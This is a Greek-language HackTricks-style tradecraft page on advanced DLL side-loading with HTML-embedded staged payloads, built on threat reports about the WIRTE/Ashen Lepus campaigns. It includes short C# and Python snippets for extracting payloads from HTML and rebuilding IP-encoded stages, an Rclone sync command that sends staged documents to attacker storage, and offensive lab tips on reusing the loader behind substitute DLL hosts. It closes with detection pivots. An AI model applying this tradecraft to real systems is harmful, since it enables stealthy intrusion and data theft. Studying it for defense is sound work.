# Προηγμένο DLL Side-Loading με Staging Payload ενσωματωμένο σε HTML

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση Tradecraft

Οι Ashen Lepus (γνωστοί και ως WIRTE) weaponized ένα επαναχρησιμοποιήσιμο μοτίβο που συνδυάζει DLL sideloading, staged HTML payloads και modular .NET backdoors για persistence μέσα σε διπλωματικά δίκτυα της Μέσης Ανατολής. Η τεχνική μπορεί να επαναχρησιμοποιηθεί από οποιονδήποτε operator, επειδή βασίζεται στα εξής:<sup>[[1]](#references)</sup>

- **Archive-based social engineering**: καλοπροαίρετα PDF καθοδηγούν τους στόχους να κατεβάσουν ένα RAR archive από file-sharing site. Το archive περιλαμβάνει ένα ρεαλιστικό EXE document viewer, ένα malicious DLL με όνομα αξιόπιστης βιβλιοθήκης (π.χ. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) και ένα decoy `Document.pdf`.
- **Abuse της DLL search order**: το θύμα κάνει double-click στο EXE, τα Windows επιλύουν το DLL import από τον τρέχοντα κατάλογο και ο malicious loader (AshenLoader) εκτελείται μέσα στην trusted process, ενώ το decoy PDF ανοίγει για την αποφυγή υποψιών.
- **Living-off-the-land staging**: κάθε επόμενο stage (AshenStager → AshenOrchestrator → modules) παραμένει εκτός δίσκου μέχρι να χρειαστεί και παραδίδεται ως encrypted blob κρυμμένο μέσα σε κατά τα άλλα harmless HTML responses.

## Αλυσίδα Multi-Stage Side-Loading

1. **Decoy EXE → AshenLoader**: το EXE κάνει side-load το AshenLoader, ο οποίος πραγματοποιεί host recon, κρυπτογραφεί το ίδιο το payload με AES-CTR και το στέλνει μέσω POST μέσα σε rotating parameters όπως `token=`, `id=`, `q=` ή `auth=` σε API-looking paths (π.χ. `/api/v2/account`).<sup>[[1]](#references)</sup>
2. **HTML extraction**: το C2 αποκαλύπτει το επόμενο stage μόνο όταν η IP του client αντιστοιχεί γεωγραφικά στην περιοχή-στόχο και το `User-Agent` ταιριάζει με το implant, εμποδίζοντας τα sandboxes. Όταν οι έλεγχοι επιτύχουν, το HTTP body περιέχει ένα blob `<headerp>...</headerp>` με το Base64/AES-CTR encrypted AshenStager payload.
3. **Second sideload**: το AshenStager αναπτύσσεται μαζί με ένα άλλο legitimate binary που κάνει import το `wtsapi32.dll`. Το malicious αντίγραφο που έχει injected στο binary κατεβάζει περισσότερο HTML, αυτή τη φορά απομονώνοντας το `<article>...</article>` για να ανακτήσει το AshenOrchestrator.
4. **AshenOrchestrator**: ένας modular .NET controller που αποκωδικοποιεί ένα Base64 JSON config. Τα πεδία `tg` και `au` του config συνενώνονται και γίνονται hash για τη δημιουργία του AES key, το οποίο αποκρυπτογραφεί το `xrk`. Τα resulting bytes λειτουργούν ως XOR key για κάθε module blob που κατεβαίνει στη συνέχεια.
5. **Module delivery**: κάθε module περιγράφεται μέσω HTML comments που ανακατευθύνουν τον parser σε ένα arbitrary tag, παρακάμπτοντας static rules που αναζητούν μόνο τα `<headerp>` ή `<article>`. Τα modules περιλαμβάνουν persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) και file exploration (`FE`).

### Μοτίβο HTML Container Parsing
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Ακόμα και αν οι defenders αποκλείσουν ή αφαιρέσουν ένα συγκεκριμένο στοιχείο, ο operator χρειάζεται μόνο να αλλάξει το tag που υποδεικνύεται στο σχόλιο HTML για να συνεχίσει την παράδοση.<sup>[[1]](#references)</sup>

### Γρήγορο Βοηθητικό Εξαγωγής (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Παραλληλισμοί Evasion με HTML Staging

Πρόσφατη έρευνα για HTML smuggling (Talos) επισημαίνει payloads κρυμμένα ως συμβολοσειρές Base64 μέσα σε blocks `<script>` σε HTML attachments, τα οποία αποκωδικοποιούνται μέσω JavaScript κατά το runtime.<sup>[[2]](#references)</sup> Το ίδιο trick μπορεί να επαναχρησιμοποιηθεί για C2 responses: encrypted blobs μπορούν να τοποθετηθούν μέσα σε ένα script tag (ή άλλο DOM element) και να αποκωδικοποιηθούν in-memory πριν από το AES/XOR, κάνοντας τη σελίδα να μοιάζει με συνηθισμένο HTML. Το Talos δείχνει επίσης layered obfuscation (μετονομασία identifiers συν Base64/Caesar/AES) μέσα σε script tags, κάτι που αντιστοιχεί άμεσα σε HTML-staged C2 blobs.<sup>[[2]](#references)</sup> Ένα μεταγενέστερο Talos writeup σχετικά με **hidden text salting** είναι επίσης σχετικό: ο διαχωρισμός του Base64 με άσχετα HTML comments ή whitespace αρκεί για να παρακαμφθούν απλοί regex extractors, ενώ η ανακατασκευή από την πλευρά του browser παραμένει απλή.<sup>[[7]](#references)</sup>

## Σημειώσεις για Recent Variants (2024-2025)

- Το Check Point παρατήρησε WIRTE campaigns το 2024, οι οποίες εξακολουθούσαν να βασίζονται σε archive-based sideloading, αλλά χρησιμοποιούσαν το `propsys.dll` (stagerx64) ως πρώτο stage. Το stager αποκωδικοποιεί το επόμενο payload με Base64 + XOR (key `53`), στέλνει HTTP requests με hardcoded `User-Agent` και εξάγει encrypted blobs ενσωματωμένα μεταξύ HTML tags. Σε ένα branch, το stage ανακατασκευαζόταν από μια μεγάλη λίστα embedded IP strings που αποκωδικοποιούνταν μέσω `RtlIpv4StringToAddressA` και στη συνέχεια concatenated στα payload bytes.<sup>[[3]](#references)</sup>
- Το OWN-CERT τεκμηρίωσε παλαιότερο WIRTE tooling, όπου το side-loaded `wtsapi32.dll` dropper προστάτευε strings με Base64 + TEA και χρησιμοποιούσε το ίδιο το DLL name ως decryption key, πριν εφαρμόσει XOR/Base64 obfuscation στα host identification data και τα στείλει στο C2.<sup>[[4]](#references)</sup>

## Ανακατασκευή IP-Encoded Stages

Το branch του WIRTE με `propsys.dll` από το 2024 δείχνει ότι το επόμενο PE δεν χρειάζεται να βρίσκεται ως ένα ενιαίο, contiguous HTML blob. Ο loader μπορεί να αποθηκεύσει τα stage bytes ως dotted-quad strings και να τα ανακατασκευάσει με `RtlIpv4StringToAddressA`, ένα pattern που σχετίζεται στενά με το **IPfuscation** tradecraft του Hive.<sup>[[3]](#references)[[5]](#references)</sup> Επιχειρησιακά, αυτό είναι χρήσιμο όταν ο actor θέλει η HTML page να περιέχει κάτι που μοιάζει με harmless IOCs ή config data αντί για ένα προφανές Base64 payload.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
Εάν τα ανακτημένα bytes ξεκινούν με `MZ`, πιθανότατα ανακατασκευάσατε απευθείας το επόμενο PE. Εάν όχι, ελέγξτε για ένα αρχικό επίπεδο XOR/Base64 ή για μικρά τμήματα οριοθέτησης μεταξύ των διευθύνσεων.

## Εναλλάξιμα ονόματα DLL και εναλλαγή host

Μια σημαντική ιδιότητα αυτού του pattern είναι ότι το **HTML/AES/XOR staging backend μπορεί να παραμένει ίδιο, ενώ αλλάζει μόνο το sideload pair**. Το WIRTE εναλλάσσει τα `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` και `propsys.dll` μεταξύ campaigns, κάτι που είναι χρήσιμο επειδή:<sup>[[1]](#references)[[3]](#references)</sup>

- Τα `propsys.dll` και `wtsapi32.dll` είναι συνηθισμένα ονόματα Windows DLL που οι defenders περιμένουν να υπάρχουν στο `%System32%` / `%SysWOW64%`.
- Δημόσιοι κατάλογοι όπως το **HijackLibs** αντιστοιχίζουν ήδη πολλά binaries που θα φορτώσουν αυτά τα DLL names από έναν αντιγραμμένο κατάλογο εφαρμογής, παρέχοντας στους operators replacement hosts χωρίς επανασχεδιασμό του stager.
- Μόνο το export surface πρέπει να προσαρμόζεται ανά host. Ο HTML parser, οι ρουτίνες AES/XOR και ο module loader μπορούν συνήθως να μεταφερθούν αυτούσιοι σε ένα forwarding proxy DLL.

Για offensive lab work, αυτό σημαίνει ότι μπορείτε να διαχωρίσετε το πρόβλημα σε **(1) εύρεση ενός σταθερού signed host που επιλύει το επιλεγμένο DLL name τοπικά** και **(2) επαναχρησιμοποίηση της ίδιας staged-HTML loader logic πίσω από αυτό το DLL**.

## Crypto και hardening του C2

- **AES-CTR παντού**: οι τρέχοντες loaders ενσωματώνουν 256-bit keys μαζί με nonces (π.χ. `{9a 20 51 98 ...}`) και προαιρετικά προσθέτουν ένα XOR layer χρησιμοποιώντας strings όπως το `msasn1.dll` πριν ή μετά την αποκρυπτογράφηση.<sup>[[1]](#references)</sup>
- **Παραλλαγές key material**: παλαιότεροι loaders χρησιμοποιούσαν Base64 + TEA για την προστασία embedded strings, με το decryption key να παράγεται από το όνομα του malicious DLL (π.χ. `wtsapi32.dll`).<sup>[[4]](#references)</sup>
- **Διαχωρισμός infrastructure + camouflage subdomain**: οι staging servers διαχωρίζονται ανά tool, φιλοξενούνται σε διαφορετικά ASNs και μερικές φορές προωθούνται μέσω subdomains που φαίνονται legitimate, ώστε η αποκάλυψη ενός stage να μην εκθέτει τα υπόλοιπα.
- **Recon smuggling**: τα enumerated data περιλαμβάνουν πλέον listings του Program Files για τον εντοπισμό high-value apps και κρυπτογραφούνται πάντα πριν αποχωρήσουν από το host.
- **URI churn**: τα query parameters και τα REST paths εναλλάσσονται μεταξύ campaigns (`/api/v1/account?token=` → `/api/v2/account?auth=`), καθιστώντας άκυρα τα brittle detections.
- **User-Agent pinning + safe redirects**: η C2 infrastructure αποκρίνεται μόνο σε ακριβή UA strings και διαφορετικά κάνει redirect σε benign news/health sites για να ενσωματώνεται στην κανονική κίνηση.
- **Gated delivery**: οι servers εφαρμόζουν geo-fencing και απαντούν μόνο σε πραγματικά implants. Οι μη εγκεκριμένοι clients λαμβάνουν unsuspicious HTML.

## Persistence και execution loop

Το AshenStager δημιουργεί scheduled tasks που μεταμφιέζονται ως Windows maintenance jobs και εκτελούνται μέσω `svchost.exe`, π.χ.:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Αυτά τα tasks επανεκκινούν την sideloading chain κατά την εκκίνηση ή σε intervals, επιτρέποντας στο AshenOrchestrator να ζητά fresh modules χωρίς να αγγίζει ξανά τον δίσκο.

## Χρήση benign sync clients για exfiltration

Οι operators τοποθετούν diplomatic documents μέσα στο `C:\Users\Public` (world-readable και μη ύποπτο) μέσω ενός dedicated module και στη συνέχεια κατεβάζουν το legitimate [Rclone](https://rclone.org/) binary για να συγχρονίσουν αυτόν τον κατάλογο με attacker storage. Το Unit42 αναφέρει ότι αυτή είναι η πρώτη φορά που ο συγκεκριμένος actor παρατηρείται να χρησιμοποιεί το Rclone για exfiltration, ευθυγραμμιζόμενος με την ευρύτερη τάση κατάχρησης legitimate sync tooling ώστε να ενσωματώνεται στη φυσιολογική κίνηση:<sup>[[1]](#references)</sup>

1. **Stage**: αντιγραφή/συλλογή των target files στο `C:\Users\Public\{campaign}\`.
2. **Configure**: αποστολή ενός Rclone config που δείχνει σε ένα attacker-controlled HTTPS endpoint (π.χ. `api.technology-system[.]com`).
3. **Sync**: εκτέλεση του `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet`, ώστε η κίνηση να μοιάζει με κανονικά cloud backups.

Επειδή το Rclone χρησιμοποιείται ευρέως σε legitimate backup workflows, οι defenders πρέπει να επικεντρώνονται σε anomalous executions (νέα binaries, ασυνήθιστα remotes ή ξαφνικό syncing του `C:\Users\Public`).

## Detection pivots

- Ειδοποίηση για **signed processes** που φορτώνουν απροσδόκητα DLLs από user-writable paths (Procmon filters + `Get-ProcessMitigation -Module`), ειδικά όταν τα DLL names σχετίζονται με τα `netutils`, `srvcli`, `dwampi`, `wtsapi32` ή `propsys`.<sup>[[6]](#references)</sup>
- Έλεγχος ύποπτων HTTPS responses για **μεγάλα Base64 blobs ενσωματωμένα σε ασυνήθιστα tags** ή προστατευμένα από σχόλια `<!-- TAG: <xyz> -->`.
- Κανονικοποίηση του HTML πρώτα: **αφαίρεση σχολίων και σύμπτυξη whitespace πριν από την εξαγωγή Base64**, επειδή η evasion τύπου hidden-text-salting μπορεί να διαχωρίζει payloads στα όρια των σχολίων.
- Επέκταση του HTML hunting σε **Base64 strings μέσα σε `<script>` blocks** (staging τύπου HTML smuggling), τα οποία αποκωδικοποιούνται μέσω JavaScript πριν από την επεξεργασία AES/XOR.
- Αναζήτηση επαναλαμβανόμενων κλήσεων στο **`RtlIpv4StringToAddressA` που ακολουθούνται από buffer assembly**, ιδιαίτερα όταν τα περιβάλλοντα strings είναι μεγάλες λίστες IPv4 και όχι πραγματικοί network targets.
- Αναζήτηση **scheduled tasks** που εκτελούν το `svchost.exe` με non-service arguments ή δείχνουν πίσω σε dropper directories.
- Παρακολούθηση **C2 redirects** που επιστρέφουν payloads μόνο για ακριβή `User-Agent` strings και διαφορετικά ανακατευθύνουν σε legitimate news/health domains.
- Παρακολούθηση για **Rclone** binaries εκτός IT-managed locations, νέα αρχεία `rclone.conf` ή sync jobs που αντλούν δεδομένα από staging directories όπως το `C:\Users\Public`.

## References

- [1] [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Seasoning email threats with hidden text salting](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)

{{#include ../../../banners/hacktricks-training.md}}
